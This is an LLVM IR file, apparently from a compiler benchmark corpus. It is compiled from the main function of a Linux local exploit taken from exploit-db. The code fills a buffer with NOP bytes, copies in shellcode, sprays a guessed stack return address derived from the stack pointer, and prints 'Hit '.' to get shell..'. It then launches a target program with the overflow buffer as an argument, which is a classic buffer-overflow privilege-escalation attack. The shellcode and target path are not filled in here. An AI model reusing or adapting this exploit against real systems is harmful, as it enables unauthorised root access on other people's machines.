; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19992.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19992.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@buf = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFFER = common dso_local global i32 0, align 4
@code = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"Hit '.' to get shell..\0A\00", align 1
@PATH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-s\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 1
  br i1 %10, label %11, label %16

11:                                               ; preds = %2
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @atoi(i8* %14)
  store i32 %15, i32* %7, align 4
  br label %16

16:                                               ; preds = %11, %2
  %17 = call i32 (...) @getesp()
  %18 = sub nsw i32 %17, 11000
  %19 = load i32, i32* %7, align 4
  %20 = add nsw i32 %18, %19
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %8, align 8
  %22 = load i32*, i32** @buf, align 8
  %23 = load i32, i32* @NOP, align 4
  %24 = load i32, i32* @BUFFER, align 4
  %25 = call i32 @memset(i32* %22, i32 %23, i32 %24)
  %26 = load i32*, i32** @buf, align 8
  %27 = getelementptr inbounds i32, i32* %26, i64 800
  %28 = load i32, i32* @code, align 4
  %29 = load i32, i32* @code, align 4
  %30 = call i32 @strlen(i32 %29)
  %31 = call i32 @memcpy(i32* %27, i32 %28, i32 %30)
  store i32 876, i32* %6, align 4
  br label %32

32:                                               ; preds = %44, %16
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* @BUFFER, align 4
  %35 = sub nsw i32 %34, 2
  %36 = icmp slt i32 %33, %35
  br i1 %36, label %37, label %47

37:                                               ; preds = %32
  %38 = load i64, i64* %8, align 8
  %39 = trunc i64 %38 to i32
  %40 = load i32*, i32** @buf, align 8
  %41 = load i32, i32* %6, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %40, i64 %42
  store i32 %39, i32* %43, align 4
  br label %44

44:                                               ; preds = %37
  %45 = load i32, i32* %6, align 4
  %46 = add nsw i32 %45, 4
  store i32 %46, i32* %6, align 4
  br label %32

47:                                               ; preds = %32
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 @fprintf(i32 %48, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %50 = load i32, i32* @PATH, align 4
  %51 = load i32, i32* @PATH, align 4
  %52 = load i32*, i32** @buf, align 8
  %53 = call i32 @execl(i32 %50, i32 %51, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %52, i32 0)
  %54 = load i32, i32* %3, align 4
  ret i32 %54
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @getesp(...) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @execl(i32, i32, i8*, i8*, i8*, i8*, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
